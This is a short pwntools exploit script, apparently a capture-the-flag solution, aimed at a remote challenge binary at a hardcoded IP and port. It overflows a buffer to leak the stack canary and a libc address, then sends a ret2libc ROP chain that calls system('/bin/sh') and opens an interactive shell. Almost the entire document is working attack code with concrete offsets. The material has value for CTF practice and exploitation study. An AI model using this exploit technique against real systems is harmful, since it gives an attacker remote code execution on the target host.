"""
except no pie all other protection are on.
1. leak canary with print(), notice that LSB of the canary always be zero.
2. due to the print function was create by 'pthread_create' so it will return to libc

cmd:
CHUNK <sleep_time> <repeat_times> <data>
"""

from pwn import *

binary = "./dist/chall"
elf = context.binary = ELF(binary, checksec=False)
libc = ELF("./dist/libc.so.6", checksec=False)

io = remote("34.45.81.67", 16006)
io.send(b"CHUNKS 8")
io.recvline()

# offset to canary: 0x48 we need one more byte to print canary out
payload = b"CHUNK 100 1 " + b"A" * 0x49
io.send(payload)
io.recvuntil(b"A" * 0x49)
canary = u64(io.recv(7).rjust(8, b"\x00"))
log.critical(f"canary: {hex(canary)}")

# offset to return address: 0x50 + 8, 8 bytes for rbp
payload = b"CHUNK 100 1 " + b"A" * 0x58
io.send(payload)
io.recvuntil(b"A" * 0x58)
libc_addr = u64(io.recv(6).ljust(8, b"\x00"))
libc_base = libc_addr - 0x9CAA4  # GDB to get it
log.critical(f"libc base: {hex(libc_base)}")

libc.address = libc_base
poprdi = libc_base + 0x10F75B
binsh = libc_base + 0x1CB42F
system = libc_base + 0x58750
log.critical(f"pop rdi: {hex(poprdi)}")
log.critical(f"binsh: {hex(binsh)}")
log.critical(f"system: {hex(system)}")

payload = (
    b"CHUNK 1 1 "
    + b"A" * 0x48
    + p64(canary)
    + b"B" * 8
    + p64(poprdi)
    + p64(binsh)
    + p64(0x40101A)
    + p64(system)
)
io.send(payload)

io.interactive()
